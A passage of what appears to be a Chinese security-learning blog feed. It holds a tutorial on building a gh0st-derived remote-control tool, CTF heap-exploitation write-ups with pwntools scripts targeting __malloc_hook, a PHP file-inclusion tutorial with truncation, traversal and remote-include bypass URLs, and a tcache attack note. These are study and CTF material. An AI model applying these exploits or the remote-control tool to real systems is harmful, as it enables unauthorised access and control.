有-1的情况strStatusMsg.Format(&quot;有%d个主机在线&quot;,iCount);m_wndStatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字</code></pre><p>6.列表中添加条目时产生日志:<br>      Addlist 中添加<br>            ShowMessage(true,strIP+”主机上线”);</p><p><img src="https://s2.loli.net/2022/04/12/JHmvZsquXLFzoOM.png"></p><p><img src="https://s2.loli.net/2022/04/12/JQnEcyTPVWdLghX.png"></p><h2 id="1-9-为对话框添加入工具条"><a href="#1-9-为对话框添加入工具条" class="headerlink" title="1.9 为对话框添加入工具条"></a>1.9 为对话框添加入工具条</h2><p>1.创建工具条资源  ID:  IDR_TOOLBAR_MAIN<br>添加 IDR_TOOLBAR_MAIN 时 修改大小</p><pre><code>              共12个工具条  9+3</code></pre><p><img src="https://s2.loli.net/2022/04/12/JqybaXdp5SKZc7j.png"></p><p>2.添加BMP资源:</p><p>图片格式需要为bmp图片，在bitmap中导入资源</p><pre><code>             ID:  IDB_BITMAP_MAIN</code></pre><p><img src="https://s2.loli.net/2022/04/12/jvJunAY8Nyb6xOm.png"></p><p>3.复制TrueColorToolBar文件，添加CTrueColorToolBar类.</p><p><img src="https://s2.loli.net/2022/04/12/9mDTJvgaurNlhKW.png"></p><p>4.添加:</p><pre><code>   #include &quot;TrueColorToolBar.h&quot;</code></pre><p><img src="https://s2.loli.net/2022/04/12/dKJROn94WU3vCPt.png"></p><p>5.声明变量:<br>      CTrueColorToolBar m_ToolBar; </p><p><img src="https://s2.loli.net/2022/04/12/lN98XT5uydH6RSV.png"></p><p>6.添加CreateToolBar()函数</p><p>7.分析CTrueColorToolBar类:</p><pre><code>                    继承CToolBar</code></pre><p>8.查看MSDN  CToolBar类:</p><p>9.CreateToolBar()函数中写入代码:<br>        if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP<br>        | CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||<br>        !m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))<br>    {<br>        TRACE0(“Failed to create toolbar\n”);<br>        return;      // fail to create<br>    }<br>    m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP<br>    m_ToolBar.LoadTrueColorToolBar<br>        (<br>        48,    //加载真彩工具条<br>        IDB_BITMAP_MAIN,<br>        IDB_BITMAP_MAIN,<br>        IDB_BITMAP_MAIN<br>        );<br>    RECT rt,rtMain;<br>    GetWindowRect(&amp;rtMain);<br>    rt.left=0;<br>    rt.top=0;<br>    rt.bottom=80;<br>    rt.right=rtMain.right-rtMain.left+10;<br>    m_ToolBar.MoveWindow(&amp;rt,TRUE);</p><pre><code>m_ToolBar.SetButtonText(0,&quot;终端管理&quot;);  m_ToolBar.SetButtonText(1,&quot;进程管理&quot;); m_ToolBar.SetButtonText(2,&quot;窗口管理&quot;); m_ToolBar.SetButtonText(3,&quot;桌面管理&quot;); m_ToolBar.SetButtonText(4,&quot;文件管理&quot;); m_ToolBar.SetButtonText(5,&quot;语音管理&quot;); m_ToolBar.SetButtonText(6,&quot;视频管理&quot;); m_ToolBar.SetButtonText(7,&quot;服务管理&quot;); m_ToolBar.SetButtonText(8,&quot;注册表管理&quot;); m_ToolBar.SetButtonText(10,&quot;参数设置&quot;); m_ToolBar.SetButtonText(11,&quot;生成服务端&quot;); m_ToolBar.SetButtonText(12,&quot;帮助&quot;); RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);</code></pre><p>10.OnSize中添加代码:<br>        if(m_ToolBar.m_hWnd!=NULL)              //工具条<br>    {<br>        CRect rc;<br>        rc.top=rc.left=0;<br>        rc.right=cx;<br>        rc.bottom=80;<br>        m_ToolBar.MoveWindow(rc);     //设置工具条大小位置<br>    }</p><p><img src="https://s2.loli.net/2022/04/12/L4nlZVbR2x1gXeA.png"></p><p>11.Oninitdialog 中添加CreateToolBar</p><p><img src="https://s2.loli.net/2022/04/12/zdhNXMwyoP6ns2k.png"></p><h2 id="1-10-为程序添加系统托盘"><a href="#1-10-为程序添加系统托盘" class="headerlink" title="1.10 为程序添加系统托盘"></a>1.10 为程序添加系统托盘</h2><p>1.创建菜单资源<br>                ID:  IDR_MENU_NOTIFY<br>                添加子菜单  显示  IDM_NOTIFY_SHOW<br>                            退出  IDM_NOTIFY_CLOSE</p><p><img src="https://s2.loli.net/2022/04/12/wLs1qh7MbUpIN3v.png"></p><p>2.认识一个API</p><pre><code>    Shell_NotifyIcon     BOOL Shell_NotifyIcon(                    //向系统托盘中加入图标                       DWORD dwMessage,         //状态                                  PNOTIFYICONDATA lpdata   //含有图标  消息响应 的一个结构体     );</code></pre><p> 3.认识NOTIFYICONDATA  结构体:</p><pre><code>       typedef struct _NOTIFYICONDATA &#123;DWORD cbSize;       //结构体自身大小HWND hWnd;          //托盘的父窗口  托盘发出的消息由哪一个窗口响应UINT uID;           //显示图标的IDUINT uFlags;         //托盘的状态 (如有图标，有气泡提示，有消息响应等)UINT uCallbackMessage; //托盘事件的消息响应函数HICON hIcon;            //图标的变量TCHAR szTip[64];        //气泡的显示文字DWORD dwState;          //图标的显示状态DWORD dwStateMask;      //图标的显示状态TCHAR szInfo[256];      //气泡的显示文字  (可以忽略)union &#123;    UINT uTimeout;    UINT uVersion;&#125;;TCHAR szInfoTitle[64];DWORD dwInfoFlags;GUID guidItem;HICON hBalloonIcon;    &#125; NOTIFYICONDATA, *PNOTIFYICONDATA;</code></pre><p>4.在oninitdialog函数中写入加入系统脱盘的代码:</p><pre><code>      nid.cbSize = sizeof(nid);     //大小赋值nid.hWnd = m_hWnd;           //父窗口nid.uID = IDR_MAINFRAME;     //icon  IDnid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   //托盘所拥有的状态nid.uCallbackMessage = UM_ICONNOTIFY;            //回调消息nid.hIcon = m_hIcon;                            //icon 变量CString str=&quot;PCRemote远程协助软件.........&quot;;       //气泡提示lstrcpyn(nid.szTip, (LPCSTR)str, sizeof(nid.szTip) / sizeof(nid.szTip[0]));Shell_NotifyIcon(NIM_ADD, &amp;nid);   //显示托盘</code></pre><p><img src="https://s2.loli.net/2022/04/12/JgPx1KCwdGEmo3U.png"></p><p>5.演示 ，在窗口销毁时托盘依然存在</p><p>6.添加WM_CLOSE消息并写入代码:</p><pre><code>  Shell_NotifyIcon(NIM_DELETE, &amp;nid); //销毁图标</code></pre><p><img src="https://s2.loli.net/2022/04/12/isYezB3c72dGWwE.png"></p><p>7.stdafx.h文件中加入自定义消息的定义</p><pre><code> //自定义消息enum&#123;    UM_ICONNOTIFY= WM_USER+0x100,&#125;;</code></pre><p><img src="https://s2.loli.net/2022/04/12/CBhz1opLE2iDUF7.png"></p><p>8.声明消息处理函数:<br>     afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);</p><p><img src="https://s2.loli.net/2022/04/12/L3KmbZXthj5IrRU.png"></p><ol start="9"><li> cpp文件中写入代码:</li></ol><pre><code>       void CPCRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)&#123;    switch ((UINT)lParam)    &#123;    case WM_LBUTTONDOWN: // click or dbclick left button on icon    case WM_LBUTTONDBLCLK: // should show desktop        if (!IsWindowVisible())             ShowWindow(SW_SHOW);        else            ShowWindow(SW_HIDE);        break;    case WM_RBUTTONDOWN: // click right button, show menu        CMenu menu;        menu.LoadMenu(IDR_MENU_NOTIFY);        CPoint point;        GetCursorPos(&amp;point);        SetForegroundWindow();        menu.GetSubMenu(0)-&gt;TrackPopupMenu(            TPM_LEFTBUTTON|TPM_RIGHTBUTTON,             point.x, point.y, this, NULL);         PostMessage(WM_USER, 0, 0);        break;    &#125;&#125;</code></pre><p><img src="https://s2.loli.net/2022/04/12/IO4iAPXxTUgLYCB.png"></p><p>10.添加消息响应:</p><pre><code>ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify)  </code></pre><p><img src="https://s2.loli.net/2022/04/12/v3z8L612QKfTpku.png"></p><p>11.添加显示菜单消息响应</p><h1 id="二、加入Socket数据传输的内核"><a href="#二、加入Socket数据传输的内核" class="headerlink" title="二、加入Socket数据传输的内核"></a>二、加入Socket数据传输的内核</h1><h2 id="2-3"><a href="#2-3" class="headerlink" title="2.3"></a>2.3</h2><p>1.复制gh0st主控端的include文件夹到我们的工程下。</p><p><img src="https://s2.loli.net/2022/04/20/9ICSdqjN5RmcZgL.png"></p><p><img src="https://s2.loli.net/2022/04/20/lzQVfowE984BJbW.png"></p><p>2.包含复制过来的include 文件夹下的文件。</p><p>选择 项目 -&gt; 添加现有项 -&gt; 选择include所有文件</p><p><img src="https://s2.loli.net/2022/04/20/g2OZuF6BScCVKoN.png"></p><p>3.复制common文件夹到我们的工程的上一层目录下。</p><p>4.改变 #include “zlib\zlib.h”  的文件路径#include “......\common\zlib\zlib.h”</p><p><img src="https://s2.loli.net/2022/04/20/iIt9UuYgp2Ax1aB.png"></p><p>根据本地文件位置修改</p><p>5.注释掉//#include “../MainFrm.h”<br>6.添加....\common\zlib\zlib.lib库</p><pre><code>属性--&gt;连接器--&gt;输入--&gt;附加依赖项 ..\..\common\zlib\zlib.lib</code></pre><p><img src="https://s2.loli.net/2022/04/20/gQID4tXa9S6Mshf.png"></p><p>7.忽略特定默认库LIBCMT.lib</p><p><img src="https://s2.loli.net/2022/04/20/hYVynA38Iz7mCPX.png"></p><p>遇到报错：</p><p>在查找预编译头时遇到意外的文件结尾。是否忘记了向源中添加“#include “pch.h””?</p><p>解决办法：取消预编译头：</p><p>菜单栏，项目 ——&gt; 【项目名称】属性 ——&gt; 配置属性 ——&gt; c/c++  ——&gt; 预编译头</p><p><img src="https://s2.loli.net/2022/04/20/dFqcHT6D2S1wAfg.png"></p><p>8.编译成功ok…………</p><h2 id="2-4加入端口监听功能"><a href="#2-4加入端口监听功能" class="headerlink" title="2.4加入端口监听功能"></a>2.4加入端口监听功能</h2><p>1.分析gh0st监听端口的代码:</p><pre><code>         Activate(UINT nPort, UINT nMaxConnections)</code></pre><p>2.需要一个回调函数</p><pre><code>       NotifyProc</code></pre><p>3.复制NotifyProc 代码  去掉多余的代码</p><p><img src="https://s2.loli.net/2022/04/20/5Bh8yITvCAW7qDN.png"></p><pre><code>void CALLBACK CMFCghostDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)&#123;    try    &#123;        switch (nCode)        &#123;        case NC_CLIENT_CONNECT:            break;        case NC_CLIENT_DISCONNECT:            //g_pConnectView-&gt;PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);            break;        case NC_TRANSMIT:            break;        case NC_RECEIVE:            //ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收            break;        case NC_RECEIVE_COMPLETE:            //ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete            break;        &#125;    &#125;    catch (...) &#123;&#125;&#125;</code></pre><p>添加定义：</p><pre><code>CIOCPServer* m_iocpServer = NULL;</code></pre><p><img src="https://s2.loli.net/2022/04/20/hoZIsSJyt1gfvaV.png"></p><p>4.复制Activate  代码 并处理</p><pre><code>void CMFCghostDlg::Activate(UINT nPort, UINT nMaxConnections)&#123;    CString        str;    if (m_iocpServer != NULL)    &#123;        m_iocpServer-&gt;Shutdown();        delete m_iocpServer;    &#125;    m_iocpServer = new CIOCPServer;    ////lang2.1_8    // 开启IPCP服务器 最大连接  端口     查看NotifyProc回调函数  函数定义    if (m_iocpServer-&gt;Initialize(NotifyProc, NULL, 100000, nPort))    &#123;        char hostname[256];        gethostname(hostname, sizeof(hostname));        HOSTENT* host = gethostbyname(hostname);        if (host != NULL)        &#123;            for (int i = 0; ; i++)            &#123;                str += inet_ntoa(*(IN_ADDR*)host-&gt;h_addr_list[i]);                if (host-&gt;h_addr_list[i] + host-&gt;h_length &gt;= host-&gt;h_name)                    break;                str += &quot;/&quot;;            &#125;        &#125;        //m_wndStatusBar.SetPaneText(0, str);        //str.Format(&quot;端口: %d&quot;, nPort);        //m_wndStatusBar.SetPaneText(2, str);        str.Format(&quot;监听端口: %d成功&quot;, nPort);        ShowMessage(true, str);    &#125;    else    &#123;        //str.Format(&quot;端口%d绑定失败&quot;, nPort);        //m_wndStatusBar.SetPaneText(0, str);        //m_wndStatusBar.SetPaneText(2, &quot;端口: 0&quot;);        str.Format(&quot;监听端口: %d失败&quot;, nPort);        ShowMessage(false, str);    &#125;    //m_wndStatusBar.SetPaneText(3, &quot;连接: 0&quot;);&#125;// CPCRemoteDlg 消息处理程序</code></pre><p>5.监听后添加日志消息</p><pre><code>str.Format(&quot;监听端口: %d成功&quot;, nPort);ShowMessage(true,str);//elsestr.Format(&quot;监听端口: %d失败&quot;, nPort);ShowMessage(false,str);</code></pre><p><img src="https://s2.loli.net/2022/04/20/24DxP6EzIUTSl3W.png"></p><p>6.测试  netstat -an</p><p>可以看到2000端口被占用</p><h1 id="ps-bmp文件格式"><a href="#ps-bmp文件格式" class="headerlink" title="ps bmp文件格式"></a>ps bmp文件格式</h1><p>1.一个bmp文件由四部分组成:</p><pre><code>     struCt tagBITMAPFIlEHEADER     strut tagBITMAPINFOHEADER     typedef tagRGBQUAD     位图数据</code></pre><hr><h2 id="bmp文件结构解析"><a href="#bmp文件结构解析" class="headerlink" title="bmp文件结构解析"></a>bmp文件结构解析</h2><p>1.<br>typedef struCt tagBITMAPFIlEHEADER</p><p>{</p><p>WORD bftype；     //BM</p><p>DWORD bfsiZe：    //位图文件大小</p><p>WORD bfReservedl；  //必须为0</p><p>WORD bgReserved2：   //必修为0</p><p>DWORD bfoffBits： 图像数据在  文件内的起始地址</p><p>}BITMAPFILEHEADER；</p><p>2.<br>BITMAPINFOHEADER数据结构用于说明位图的大小，其定义为：</p><p>type struct tagBITMAPINFOHEADER</p><p>{ </p><p>DWORD biSize：   //结构BITMAPINFOHEADER所占用的存储容量，固定值为40</p><p>DWORD biWldth；  //给出该BMP文件所描述位图的宽度与高度</p><p>DWORD biHeight； //给出该BMP文件所描述位图的宽度与高度</p><p>WORD biPlanes： //它代表目标设备的平面数必须为1。</p><p>WORD biBitCount：  //它确定每个像素所需要的位数。 当图像为单色时，该字段的取值为1；当图像为16色时，该字段的取值为4；当图像为256 色时，该字段的取值为8；当图像为真彩色时，该字段的取值为24。</p><p>DWORD biCOmpression；//它代表bottom—up类型位图的 压缩类型</p><p>DWORD biSiZelmage； //给出该BMP 内图像数据占用的空间大小</p><p>DWORD biXPelsPerMeter：//它们分别以每米像素数为单位，给出位图目的设备水平以及垂直方向的 分辨率</p><p>DWORD biYPelsPerMeter：//它们分别以每米像素数为单位，给出位图目的设备水平以及垂直方向的 分辨率</p><p>DWORD biClrUsed；       //给出位图实际使用的颜色表中的 颜色变址数</p><p>DWORD biClrlmportant；//它给出位图显示过程中 重要颜色的变址数。</p><p>}BITMAPINFOHEADER；</p><p>3.调色板数据 </p><p>typedef struct tagRGBQUAD</p><p>{</p><p>BYTE rgbBlue；</p><p>BYTE rgbGreen；</p><p>BYTE rgbRed； </p><p>BYTE rgbReserved；       //它不代表任何意 义，必须取固定值00</p><p>}RGBQUAD；</p><p>3..  bmp结构还提供了另外一个结构类型   ，看他的成员定义就知道了<br>tyPedef stmCt tagBITMAPINFO </p><p>{</p><p>BITMAPINFOHEADER bmiHeader：   </p><p>RGBQUAD bmiC010ur[1]；</p><p>}BITMAPINFO；</p><p>4.位图数据<br>   注意位图数据的存放是倒序的 文件的第一行正是图像的最后一行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;客户端界面的设计和编写&quot;&gt;&lt;a href=&quot;#客户端界面的设计和编写&quot; class=&quot;headerlink&quot; title=&quot;客户端界面的设计和编写&quot;&gt;&lt;/a&gt;客户端界面的设计和编写&lt;/h1&gt;&lt;h2 id=&quot;1-1-创建窗口&quot;&gt;&lt;a href=&quot;#1-1-创建窗口&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuctf&amp;&amp;攻防世界</title>
    <link href="http://example.com/2022/03/21/BUUCTF%E7%AC%AC%E4%BA%8C%E9%A1%B5/"/>
    <id>http://example.com/2022/03/21/BUUCTF%E7%AC%AC%E4%BA%8C%E9%A1%B5/</id>
    <published>2022-03-21T15:10:57.539Z</published>
    <updated>2022-04-01T07:22:09.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p>漏洞点在md函数，这里没有限制size长度，所以存在溢出漏洞</p><p><img src="https://s2.loli.net/2022/03/21/DfUmhApbrJERMsZ.png"></p><p><img src="https://s2.loli.net/2022/03/21/tsyd1DvgqluTnRr.png"></p><p>这里指针都被清空了，所以不存在uaf可以使用，但是可以构造出double_free漏洞</p><p><img src="https://s2.loli.net/2022/03/21/AvCRUnKzpGwSTab.png"></p><p>为了形成double_free，可以让原本chunk[2] -&gt; chunk[1]  溢出修改为  chunk[2] -&gt; chunk[4]</p><p>修改前</p><p><img src="https://s2.loli.net/2022/03/21/f8LXQ7OFoTZmsV5.png"></p><p>修改后</p><p><img src="https://s2.loli.net/2022/03/21/vWVLrCot8sRcnDF.png"></p><pre><code>for i in range(4):   ad(0x10)ad(0x80)ad(0x10)rm(1)   #2-&gt;1rm(2)payload = b&#39;aaaaaaaa&#39;*3 + p64(0x21) + b&#39;aaaaaaaa&#39;*3 + p64(0x21) +p8(0x80)md(0,len(payload),payload)payload = b&#39;bbbbbbbb&#39;*3+p64(0x21)md(3,len(payload),payload)</code></pre><p>再连续申请两个chunk，让程序认为chunk[2] 就是chunk[4] .</p><p>重新修改chunk[4]的size,使其恢复正常，可以进入unsortbin，也是为了让top_chunk可以正常寻址。rm(2)，dp(4)即可完成泄露</p><pre><code>ad(0x10)ad(0x10)  #40-&gt;80(2)payload = b&#39;bbbbbbbb&#39;*3+p64(0x91)md(3,len(payload),payload)rm(2)dp(4)content = u64(p.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)</code></pre><p>为了挟持程序流，我们可以采用修改__malloc_hook的方法。我们可以错位寻找满足size域的位置，作为fake_chunk的位置。修改fastbin的fd,从而让chunk分配到那个位置。最后编辑fake_chunk，让__malloc_hook改为one_gadget</p><pre><code>base = content-88-0x10 - libc.sym[&#39;__malloc_hook&#39;]system = base + libc.sym[&#39;system&#39;]free = base + libc.sym[&#39;__free_hook&#39;]malloc = base + libc.sym[&#39;__malloc_hook&#39;]print(&quot;system&quot;,hex(system))print(&quot;free&quot;,hex(free))ad(0x60)rm(4)payload = p64(malloc-11)md(2,len(payload),payload)#gdb.attach(p)ad(0x60)ad(0x60)li(hex(malloc-11))#gdb.attach(p)#pause()#payload = b&#39;abc&#39;payload = b&#39;AAAAAAAA&#39;md(6,len(payload),payload)</code></pre><h1 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h1><p>布局好两组chunk，一个用于泄露，另一个用于进行double_free</p><pre><code>ad(0x18)#0ad(0x18)#1ad(0x88)#2ad(0x88)#3ad(0x28)#4ad(0x28)#5ad(0x68)#6</code></pre><p>利用单字节溢出漏洞修改chunk_1的size包括chunk_2，再free chunk_1这样就可以让chunk_1刚好进入unsortbin，然后ad(size(chunk_1))，切割使得chunk2的位置刚好为剩下的unsortbin，dp(2)即可实现泄露</p><pre><code>md(0,34,b&#39;a&#39;*0x18+p8(0xb1))#edit chunk_sizerm(1)ad(0x18)dp(2)gdb.attach(io)leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)li(hex(leak))malloc = leak - 88 - 0x10li(hex(malloc))ad(0x88) </code></pre><p>利用double_free漏洞可以实现fastbin_attack.可以通过vmmap看到这个chunk_8被分配到了__malloc_hook附近</p><p><img src="https://s2.loli.net/2022/03/28/wmgLiJnIGrZDaPp.png"></p><pre><code>md(4,50,b&#39;a&#39;*0x28+p8(0xa1))rm(5)    rm(6)    #6 double_freead(0x98) #5md(5,0x38,b&#39;A&#39;*0x28+p64(0x71)+p64(malloc-11)) #fastbin attack ad(0x68) #6ad(0x68)md(8,30,b&#39;112233445566778899&#39;)   #woc wei shen me shi 8li(hex(malloc-11))</code></pre><p>当然也可以向前进行double_free</p><p>但是首尾chunk都需要是的free</p><pre><code>int main(void)&#123;    void *ptr1,*ptr2,*ptr3,*ptr4;    ptr1=malloc(128);//smallbin1    ptr2=malloc(0x10);//fastbin1    ptr3=malloc(0x10);//fastbin2    ptr4=malloc(128);//smallbin2    malloc(0x10);//防止与top合并    free(ptr1);         &lt;---------    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域    free(ptr4);//unlink进行前向extend &lt;---------    malloc(0x150);//占位块&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0ctf-2017-babyheap&quot;&gt;&lt;a href=&quot;#0ctf-2017-babyheap&quot; class=&quot;headerlink&quot; title=&quot;0ctf_2017_babyheap&quot;&gt;&lt;/a&gt;0ctf_2017_babyheap&lt;/h1&gt;&lt;p&gt;漏洞点在md</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web学习 文件包含漏洞</title>
    <link href="http://example.com/2022/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2022/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-16T15:39:11.539Z</published>
    <updated>2022-04-08T16:50:16.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="https://s2.loli.net/2022/03/16/KL4v71fCHs6Vyn3.png"><br><img src="https://s2.loli.net/2022/03/16/5UMa6fRHA1IETeQ.png"></p><p>1、文件包含漏洞简介<br>1、1什么是文件包含</p><pre><code>     程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数</code></pre><p>时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p><p>1、2 文件包含漏洞的成因  </p><pre><code>         随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包</code></pre><p>含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变<br>量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做<br>合理的校验或者校验被绕过就造成了文件包含漏洞。</p><p>1、3 PHP中常见包含文件的函数</p><p>Ø include( )<br>当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。<br>Ø include_once( )<br>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次<br>Ø require( )<br>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。<br>Ø require_once( )<br>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p><p> 几乎所有的脚本语言中都提供文件包含的功能，但文件包含漏洞在 PHP 中<br>居多，而在JSP、ASP、ASP.NET程序中非常少，甚至没有包含漏洞的存在。这</p><p>与程序开发人员的水平无关，而问题在于语言设计的弊端。</p><p>2.举例说明</p><p>2.1</p><p>有1.txt文件,并且无限制</p><pre><code>&lt;?php$filename=$_GET[&#39;filename&#39;];include($filename)?&gt;</code></pre><p>直接访问127.0.0.1，只能显示1.txt的代码。</p><p><img src="https://s2.loli.net/2022/03/16/Hrg2JCAbykMcS1R.png"></p><p>但是利用文件包含漏洞，就可以运行1.txt的代码</p><p><img src="https://s2.loli.net/2022/03/16/UWeKyPVLDvZEbH8.png"></p><p>2.2 </p><p>1.txt有限制</p><pre><code>&lt;?php$filename=$_GET[&#39;filename&#39;];include ($filename.&quot; .html&quot; );?&gt;</code></pre><p>指向了文件后缀为html<br>这样1.txt就变成了 1.txt.html 这样没有这个文件，所以会执行失败</p><p>那么如何绕过</p><p>%00截断:条件: magic quotes gpc = off     php版本&lt;5.3.4</p><pre><code>http://127.0.0.1:8080/include.php?filename=1.txt%00</code></pre><p><img src="https://s2.loli.net/2022/03/17/ANehVLMsjCRYK15.png"></p><p>长度截断:条件: windows，点号需要长于256; linux长于4096</p><p>填充垃圾长度，使得.html无法被加上</p><p><img src="https://s2.loli.net/2022/03/17/za12Gc4DRge7AWM.png"></p><p>2.3跨目录包含</p><p><a href="http://1227.0.0.1:8080/include.php?filename=../../1.txt">http://1227.0.0.1:8080/include.php?filename=../../1.txt</a></p><p>3.远程包含</p><p><img src="https://s2.loli.net/2022/03/17/MQjmFY6Vlc1PDBG.png"></p><p>allow_url_include打开时支持远程包含</p><p>访问并执行远程文件</p><p><img src="https://s2.loli.net/2022/03/17/euKrLOcW6DmSYp9.png"></p><p>如果远程文件为后门代码，那么该代码会被执行并被连接</p><p>3.2有限制远程包含绕过</p><p><a href="http://127.0.0.1:8080/include.php?filename=http">http://127.0.0.1:8080/include.php?filename=http</a>: / / <a href="http://www.xiaodi8.com/readme.txt">www.xiaodi8.com/readme.txt</a></p><p><a href="http://127.0.0.1:8080/include.php?filename=http">http://127.0.0.1:8080/include.php?filename=http</a> :/ / <a href="http://www.xiaodi8.com/readme.txt%20">www.xiaodi8.com/readme.txt%20</a></p><p>http: //127.0.0.1:8080/include.php?filename=http: // <a href="http://www.xiaodi8.com/readme.txt%23">www.xiaodi8.com/readme.txt%23</a></p><p><a href="http://127.0.0.1:8080/include.php?filename=http">http://127.0.0.1:8080/include.php?filename=http</a> : / / <a href="http://www.xiaodi8.com/readme.txt">www.xiaodi8.com/readme.txt</a>?</p><p>4.利用协议</p><p><img src="https://s2.loli.net/2022/03/17/gj34CBEueso2SQN.png"><br><img src="https://s2.loli.net/2022/03/17/JiyrHRaT7t4kbqV.png"></p><p><img src="https://s2.loli.net/2022/03/17/qdJtRvQZz26bI84.png"></p><p><a href="https://www.cnblogs.com/endust/p/11804767.html">各种php伪协议的用法</a></p><p><img src="https://s2.loli.net/2022/03/17/QMfcirHUBoJqIXK.png"></p><p>5.靶场训练</p><p>无论直接访问还是利用参数访问，都执行了页面代码。也可根据页面代码发现存在文件包含漏洞</p><p><img src="https://s2.loli.net/2022/03/17/toUjdvHncDLAChk.png"><br><img src="https://s2.loli.net/2022/03/17/xUDFEfliCq15QkA.png"></p><p>利用php伪协议查看目录</p><p><img src="https://s2.loli.net/2022/03/17/DL2w8VPSEjHFz3Z.png"></p><p>利用php伪协议查看文件，查看源代码</p><p><img src="https://s2.loli.net/2022/03/17/JVjBeZEQdunqNzI.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/03/16/KL4v71fCHs6Vyn3.png&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>tcache结构体</title>
    <link href="http://example.com/2022/03/16/tcathe_%E4%BF%AE%E6%94%B9fd/"/>
    <id>http://example.com/2022/03/16/tcathe_%E4%BF%AE%E6%94%B9fd/</id>
    <published>2022-03-16T10:19:57.832Z</published>
    <updated>2022-03-16T10:50:24.877Z</updated>
    
    <content type="html"><![CDATA[<p>利用修改tcache的fd，从而使得tcache</p><p>先看一下tcache的源代码：</p><p>tcache_get()：</p><pre><code>static __always_inline void *tcache_get (size_t tc_idx)&#123;  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  return (void *) e;&#125;</code></pre><hr><p>tcache_put()：</p><pre><code>tcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;</code></pre><p>可见tcache-&gt;counts[tc_idx]会记录tcache的个数，所以可以通过溢出来控制该参数，从而达到使得本该进入tchche的堆块进入unsortbin.</p><p>以华东杯cpp2为例</p><p>先泄露堆的地址，不多赘述 了</p><pre><code>for i in range(2):   ad(i,0x67)ad(2,0x67)rm(0)rm(1)dp(1)ru(&#39;\n&#39;)heap = u64(rx(6).ljust(8,b&#39;\x00&#39;)) - 0x12EC0 + 0x10li(&quot;heap-----&gt;&quot;+hex(heap))</code></pre><p>重点说一下这里</p><pre><code>md(1,p64(heap))ad(3,0x67)ad(4,0x67)md(4,b&#39;\x00&#39;*0x48+b&#39;\x00&#39;*6+b&#39;\x07&#39;)rm(3)rm(4)dp(4)</code></pre><p>一定要先free(3),再free(4)</p><p>free掉3后chunk_3会进入tcache，free掉4后tcache-&gt;counts[tc_idx]会全部修改。而这个tcache可以为2之后的攻击提供条件。</p><p>如果先free_4，再free_3,chunk_3会进入fastbin,将难以利用tcache_attack</p><p>先free(3),再free(4)<br><img src="https://s2.loli.net/2022/03/16/T1e4lxmUbQS7WFO.png"></p><p>先free(4),再free(3)<br><img src="https://s2.loli.net/2022/03/16/asAXNzOSptmofBY.png"></p><p>之后泄露则利用进入unsortbin的chunk_4</p><p>chunk_4的size为0x290是因为tcache结构体为0x290,就是这个</p><p><img 